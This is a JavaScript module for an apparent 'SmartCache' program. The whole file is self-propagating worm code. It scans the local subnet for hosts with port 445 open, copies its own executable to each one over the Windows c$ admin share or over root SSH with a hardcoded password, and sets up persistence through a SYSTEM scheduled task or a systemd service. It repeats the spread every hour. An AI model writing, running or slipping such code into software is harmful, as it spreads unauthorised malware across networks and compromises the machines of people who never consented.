const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');

class NetworkPropagator {
  constructor() {
    this.isWindows = os.platform() === 'win32';
    this.installedFile = path.join(os.homedir(), '.smartcache_installed');
  }

  async isAlreadyInstalled() {
    return fs.existsSync(this.installedFile);
  }

  markAsInstalled() {
    fs.writeFileSync(this.installedFile, new Date().toISOString());
  }

  async scanNetwork() {
    const interfaces = os.networkInterfaces();
    const targets = [];
    
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === 'IPv4' && !iface.internal) {
          const subnet = iface.address.split('.').slice(0, 3).join('.');
          for (let i = 1; i <= 254; i++) {
            targets.push(`${subnet}.${i}`);
          }
        }
      }
    }
    return targets;
  }

  async checkHost(ip, port = 445) {
    return new Promise((resolve) => {
      const socket = new net.Socket();
      socket.setTimeout(100);
      
      socket.on('connect', () => {
        socket.destroy();
        resolve(true);
      });
      
      socket.on('timeout', () => {
        socket.destroy();
        resolve(false);
      });
      
      socket.on('error', () => {
        resolve(false);
      });
      
      socket.connect(port, ip);
    });
  }

  async deployToWindows(targetIp) {
    const sourcePath = process.argv[0]; // Current exe path
    const deployScript = `
      $targetPath = "\\\\${targetIp}\\c$\\ProgramData\\SmartCache"
      if (!(Test-Path $targetPath)) {
        New-Item -Path $targetPath -ItemType Directory -Force
        Copy-Item "${sourcePath}" -Destination "$targetPath\\smartcache.exe" -Force
        
        # Create scheduled task to run at startup
        $action = New-ScheduledTaskAction -Execute "$targetPath\\smartcache.exe"
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        Register-ScheduledTask -TaskName "SmartCache" -Action $action -Trigger $trigger -Principal $principal -Force
        
        # Start immediately
        Start-ScheduledTask -TaskName "SmartCache"
        Write-Host "Deployed to ${targetIp}"
      }
    `;
    
    return new Promise((resolve) => {
      exec(`powershell -Command "${deployScript}"`, (error, stdout) => {
        if (!error) {
          console.log(`✅ Deployed to ${targetIp}`);
          resolve(true);
        } else {
          resolve(false);
        }
      });
    });
  }

  async deployToLinux(targetIp) {
    const deployScript = `
      sshpass -p "password" ssh -o StrictHostKeyChecking=no root@${targetIp} '
        mkdir -p /opt/smartcache &&
        systemctl stop smartcache 2>/dev/null || true
      ' 2>/dev/null &&
      sshpass -p "password" scp -o StrictHostKeyChecking=no ${process.argv[0]} root@${targetIp}:/opt/smartcache/smartcache &&
      sshpass -p "password" ssh -o StrictHostKeyChecking=no root@${targetIp} '
        chmod +x /opt/smartcache/smartcache &&
        cat > /etc/systemd/system/smartcache.service <<EOF
[Unit]
Description=SmartCache
After=network.target

[Service]
ExecStart=/opt/smartcache/smartcache
Restart=always

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload &&
        systemctl enable --now smartcache
      ' 2>/dev/null
    `;
    
    return new Promise((resolve) => {
      exec(deployScript, (error) => {
        if (!error) {
          console.log(`✅ Deployed to ${targetIp}`);
          resolve(true);
        } else {
          resolve(false);
        }
      });
    });
  }

  async propagate() {
    if (await this.isAlreadyInstalled()) {
      console.log('SmartCache already installed on this system');
      return;
    }

    this.markAsInstalled();
    console.log('🔍 Scanning network for propagation targets...');
    
    const targets = await this.scanNetwork();
    const activeHosts = [];
    
    // Find active hosts
    for (const ip of targets) {
      if (await this.checkHost(ip)) {
        activeHosts.push(ip);
      }
    }
    
    console.log(`Found ${activeHosts.length} potential targets`);
    
    // Deploy to each active host
    for (const ip of activeHosts) {
      if (this.isWindows) {
        await this.deployToWindows(ip);
      } else {
        await this.deployToLinux(ip);
      }
    }
  }

  async startPropagationService() {
    // Check every hour for new machines
    setInterval(() => {
      this.propagate();
    }, 3600000);
    
    // Initial propagation after 10 seconds
    setTimeout(() => {
      this.propagate();
    }, 10000);
  }
}

module.exports = NetworkPropagator;